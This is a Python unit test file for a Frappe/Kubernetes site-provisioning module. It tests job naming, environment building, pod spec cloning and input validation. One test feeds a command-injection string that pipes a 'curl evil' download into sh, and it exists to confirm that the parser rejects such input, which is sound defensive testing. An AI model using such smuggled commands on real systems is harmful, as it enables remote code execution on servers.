# Copyright (c) 2026, Los Favs and Contributors
# See license.txt

from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest
from frappe.tests import UnitTestCase

from kubeport.tasks.site_tasks import (
	_bench_new_site_command,
	_build_env,
	_build_job_manifest,
	_clone_reference_pod_spec,
	_job_name,
	_merge_env,
	_parse_install_apps,
	_safe_label_value,
)


class UnitTestSiteHelpers(UnitTestCase):
	def test_job_name_slugifies_and_includes_token_prefix(self):
		name = _job_name("erp.example.com", "deadbeefdeadbeefdeadbeefdeadbeef")
		# '.' → '-', collapsed, prefix, and token[:12]
		self.assertEqual(name, "ks-erp-example-com-deadbeefdead")

	def test_job_name_truncates_long_site_to_40_chars_of_slug(self):
		site = "a" * 80
		name = _job_name(site, "abcdefabcdefabcdefabcdefabcdefab")
		# prefix "ks-" (3) + 40 a's + '-' + 12 hex = 56
		self.assertEqual(name, "ks-" + "a" * 40 + "-abcdefabcdef")

	def test_safe_label_value_strips_slash_and_truncates_to_63(self):
		value = "helm-release/" + "x" * 100
		result = _safe_label_value(value)
		self.assertLessEqual(len(result), 63)
		self.assertNotIn("/", result)
		self.assertFalse(result.endswith("-"))

	def test_parse_install_apps_strips_blank_lines_and_whitespace(self):
		self.assertEqual(
			_parse_install_apps("  erpnext  \n\n  payments  \n"),
			["erpnext", "payments"],
		)

	def test_parse_install_apps_rejects_shell_metacharacters(self):
		with pytest.raises(ValueError):
			_parse_install_apps('erpnext"; curl evil | sh; #')

	def test_parse_install_apps_rejects_uppercase_and_spaces(self):
		with pytest.raises(ValueError):
			_parse_install_apps("ERPNext")
		with pytest.raises(ValueError):
			_parse_install_apps("erp next")

	def test_parse_install_apps_returns_empty_on_none_or_whitespace(self):
		self.assertEqual(_parse_install_apps(None), [])
		self.assertEqual(_parse_install_apps("   \n\n"), [])

	def test_bench_command_appends_force_when_requested(self):
		cmd_forced = _bench_new_site_command("s1", ["erpnext"], force=True)
		cmd_unforced = _bench_new_site_command("s1", ["erpnext"], force=False)
		self.assertIn("--force", cmd_forced)
		self.assertNotIn("--force", cmd_unforced)

	def test_bench_command_quotes_install_apps(self):
		cmd = _bench_new_site_command("s1", ["erpnext", "payments"], force=False)
		self.assertIn('--install-app="erpnext"', cmd)
		self.assertIn('--install-app="payments"', cmd)

	def test_build_env_uses_postgres_root_user_for_postgres(self):
		env = _build_env(
			site_name="s1",
			db_type="postgres",
			admin_password="pw",
			db_root_password="root-pw",
			db_root_secret="",
			db_root_secret_key="",
		)
		db_root_user = next(e for e in env if e["name"] == "DB_ROOT_USER")
		self.assertEqual(db_root_user["value"], "postgres")

	def test_build_env_uses_secret_ref_when_db_root_secret_provided(self):
		env = _build_env(
			site_name="s1",
			db_type="mariadb",
			admin_password="pw",
			db_root_password="ignored",
			db_root_secret="mariadb-root-secret",
			db_root_secret_key="password",
		)
		db_root_password = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
		self.assertNotIn("value", db_root_password)
		self.assertEqual(
			db_root_password["valueFrom"]["secretKeyRef"],
			{"name": "mariadb-root-secret", "key": "password"},
		)

	def test_merge_env_has_overrides_win_on_name_collision(self):
		base = [
			{"name": "SITE_NAME", "value": "old"},
			{"name": "EXTRA", "value": "keep"},
		]
		overrides = [{"name": "SITE_NAME", "value": "new"}]
		merged = _merge_env(base, overrides)
		site_name = next(e for e in merged if e["name"] == "SITE_NAME")
		self.assertEqual(site_name["value"], "new")
		# base entries with non-conflicting names are preserved
		self.assertTrue(any(e["name"] == "EXTRA" for e in merged))


class UnitTestClonePodSpec(UnitTestCase):
	def _ref_pod(self, include_sites_mount: bool = True) -> SimpleNamespace:
		sites_mount = SimpleNamespace(
			name="sites-volume",
			mount_path="/home/frappe/frappe-bench/sites",
		)
		config_mount = SimpleNamespace(
			name="config-volume",
			mount_path="/home/frappe/frappe-bench/sites/common_site_config.json",
		)
		container = SimpleNamespace(
			name="frappe",
			image="frappe/erpnext:v15.0.0",
			volume_mounts=[sites_mount, config_mount] if include_sites_mount else [config_mount],
			env=[{"name": "DB_HOST", "value": "mariadb"}],
			env_from=[{"configMapRef": {"name": "frappe-config"}}],
			resources={"requests": {"cpu": "100m"}},
			security_context={"runAsUser": 1000},
		)
		sites_volume = SimpleNamespace(
			name="sites-volume",
			persistent_volume_claim={"claimName": "sites-pvc"},
		)
		unused_volume = SimpleNamespace(
			name="not-referenced",
			empty_dir={},
		)
		spec = SimpleNamespace(
			containers=[container],
			volumes=[sites_volume, unused_volume],
			service_account_name="frappe-sa",
			image_pull_secrets=[{"name": "registry-secret"}],
			security_context={"fsGroup": 1000},
			node_selector={"role": "frappe"},
			tolerations=[{"key": "dedicated", "operator": "Equal", "value": "frappe"}],
			affinity=None,
			priority_class_name="high",
			runtime_class_name=None,
		)
		return SimpleNamespace(spec=spec)

	def _fake_api_client(self) -> MagicMock:
		api_client = MagicMock()
		# sanitize_for_serialization returns a list/dict of plain dicts in the test helpers
		def _sanitize(value):
			if value is None:
				return None
			if isinstance(value, list):
				return [_sanitize(v) for v in value]
			if isinstance(value, dict):
				return value
			if isinstance(value, SimpleNamespace):
				return {
					k.replace("_", ""): _sanitize(v) if not isinstance(v, (str, int, dict)) else v
					for k, v in vars(value).items()
					if v is not None
				}
			return value

		def _sanitize_vm(vm):
			return {"name": vm.name, "mountPath": vm.mount_path}

		def _sanitize_vol(v):
			return {"name": v.name}

		def sanitize(value):
			if isinstance(value, list) and value and isinstance(value[0], SimpleNamespace):
				first = value[0]
				if hasattr(first, "mount_path"):
					return [_sanitize_vm(vm) for vm in value]
				if hasattr(first, "persistent_volume_claim") or hasattr(first, "empty_dir"):
					return [_sanitize_vol(v) for v in value]
			return value
		api_client.sanitize_for_serialization.side_effect = sanitize
		return api_client

	def test_clone_lifts_whitelisted_pod_level_fields(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		pod_level = ref["pod_level"]
		self.assertEqual(pod_level["serviceAccountName"], "frappe-sa")
		self.assertEqual(pod_level["imagePullSecrets"], [{"name": "registry-secret"}])
		self.assertEqual(pod_level["securityContext"], {"fsGroup": 1000})
		self.assertEqual(pod_level["nodeSelector"], {"role": "frappe"})
		self.assertEqual(pod_level["priorityClassName"], "high")
		# None/empty fields are filtered out
		self.assertNotIn("affinity", pod_level)
		self.assertNotIn("runtimeClassName", pod_level)

	def test_clone_includes_container_env_env_from_resources_security_context(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		self.assertEqual(ref["container_env"], [{"name": "DB_HOST", "value": "mariadb"}])
		self.assertEqual(
			ref["container_env_from"],
			[{"configMapRef": {"name": "frappe-config"}}],
		)
		self.assertEqual(ref["container_resources"], {"requests": {"cpu": "100m"}})
		self.assertEqual(ref["container_security_context"], {"runAsUser": 1000})

	def test_clone_filters_volumes_to_those_the_container_references(self):
		ref = _clone_reference_pod_spec(self._fake_api_client(), self._ref_pod())
		vol_names = {v["name"] for v in ref["volumes"]}
		# sites-volume and config-volume are referenced; not-referenced is not
		self.assertIn("sites-volume", vol_names)
		self.assertNotIn("not-referenced", vol_names)

	def test_clone_raises_when_sites_mount_is_missing(self):
		with pytest.raises(RuntimeError):
			_clone_reference_pod_spec(self._fake_api_client(), self._ref_pod(False))


class UnitTestJobManifest(UnitTestCase):
	def _ref_spec(self) -> dict:
		return {
			"image": "frappe/erpnext:v15.0.0",
			"pod_level": {
				"serviceAccountName": "frappe-sa",
				"imagePullSecrets": [{"name": "registry-secret"}],
				"securityContext": {"fsGroup": 1000},
			},
			"container_env": [{"name": "DB_HOST", "value": "mariadb"}],
			"container_env_from": [{"configMapRef": {"name": "frappe-config"}}],
			"container_resources": {"requests": {"cpu": "100m"}},
			"container_security_context": {"runAsUser": 1000},
			"volume_mounts": [{"name": "sites", "mountPath": "/home/frappe/frappe-bench/sites"}],
			"volumes": [{"name": "sites", "persistentVolumeClaim": {"claimName": "sites-pvc"}}],
		}

	def test_manifest_lifts_pod_level_fields(self):
		manifest = _build_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo.example.com",
			site_name="demo.example.com",
			db_type="mariadb",
			install_apps=["erpnext"],
			force_create=False,
			admin_password="admin",
			db_root_password="root",
			db_root_secret="",
			db_root_secret_key="",
			ref_spec=self._ref_spec(),
		)
		pod = manifest["spec"]["template"]["spec"]
		self.assertEqual(pod["serviceAccountName"], "frappe-sa")
		self.assertEqual(pod["imagePullSecrets"], [{"name": "registry-secret"}])
		self.assertEqual(pod["securityContext"], {"fsGroup": 1000})

	def test_manifest_container_includes_env_from_and_resources(self):
		manifest = _build_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo",
			site_name="demo",
			db_type="mariadb",
			install_apps=[],
			force_create=False,
			admin_password="admin",
			db_root_password="root",
			db_root_secret="",
			db_root_secret_key="",
			ref_spec=self._ref_spec(),
		)
		container = manifest["spec"]["template"]["spec"]["containers"][0]
		self.assertEqual(container["envFrom"], [{"configMapRef": {"name": "frappe-config"}}])
		self.assertEqual(container["resources"], {"requests": {"cpu": "100m"}})
		self.assertEqual(container["securityContext"], {"runAsUser": 1000})

	def test_manifest_site_env_wins_over_bench_env(self):
		ref = self._ref_spec()
		ref["container_env"] = [{"name": "SITE_NAME", "value": "WRONG"}]
		manifest = _build_job_manifest(
			job_name="ks-demo-abcdef123456",
			namespace="ns",
			site_docname="release-a/demo",
			site_name="demo",
			db_type="mariadb",
			install_apps=[],
			force_create=False,
			admin_password="admin",
			db_root_password="root",
			db_root_secret="",
			db_root_secret_key="",
			ref_spec=ref,
		)
		env = manifest["spec"]["template"]["spec"]["containers"][0]["env"]
		site_name_entries = [e for e in env if e["name"] == "SITE_NAME"]
		self.assertEqual(len(site_name_entries), 1)
		self.assertEqual(site_name_entries[0]["value"], "demo")


class UnitTestOperationTokenGuard(UnitTestCase):
	def test_site_operation_matches_returns_false_on_token_mismatch(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "current", "status": "In Progress"}
			self.assertFalse(_site_operation_matches("site", "stale", "In Progress"))

	def test_site_operation_matches_returns_false_on_status_mismatch(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "token", "status": "Active"}
			self.assertFalse(_site_operation_matches("site", "token", "In Progress"))

	def test_site_operation_matches_returns_true_when_both_match(self):
		from unittest.mock import patch

		from kubeport.tasks.site_tasks import _site_operation_matches

		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
			mock_get.return_value = {"operation_token": "token", "status": "In Progress"}
			self.assertTrue(_site_operation_matches("site", "token", "In Progress"))
